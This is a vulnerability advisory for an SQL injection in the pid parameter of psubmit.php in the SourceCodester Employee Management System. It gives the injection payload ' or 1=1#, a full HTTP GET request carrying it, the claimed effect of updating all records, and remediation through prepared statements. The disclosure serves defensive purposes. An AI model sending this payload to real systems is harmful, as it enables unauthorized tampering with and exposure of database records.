# SourceCodester Employee Management System psubmit.php SQL Injection

## Vendor Homepage:
[SourceCodester Employee Management System](https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html)

## Impact:
The SQL injection vulnerability in the `psubmit.php` script of the SourceCodester Employee Management System allows attackers to manipulate the SQL query by injecting malicious SQL code through the `pid` parameter. By crafting a specially-crafted payload such as `"' or 1=1#"`, an attacker can bypass authentication and gain unauthorized access to sensitive information or modify database records. This could lead to data leakage, integrity compromise, and potential loss of confidential information, posing a significant security risk to the application and its users.

## Proof of Concept

1. Make a GET request to `psubmit.php`.
2. Use the parameter `pid` with the payload `"' or 1=1#"`.
3. All records are updated.

## Request Example:

```http
GET /psubmit.php?pid='+or+1%3d1%23&id=1 HTTP/1.1
Host: [REDACTED]
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
sec-ch-ua-platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Remediation:
To mitigate the SQL injection vulnerability in psubmit.php, it is recommended to use prepared statements or parameterized queries to handle database queries. These methods ensure that user input is properly sanitized and treated as data rather than executable SQL code, effectively preventing SQL injection attacks. Additionally, input validation and output encoding should be implemented to further secure the application against injection attacks. Regular security assessments and code reviews can help identify and address any vulnerabilities in the application's codebase, ensuring robust protection against SQL injection and other security threats.

### CWE:
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)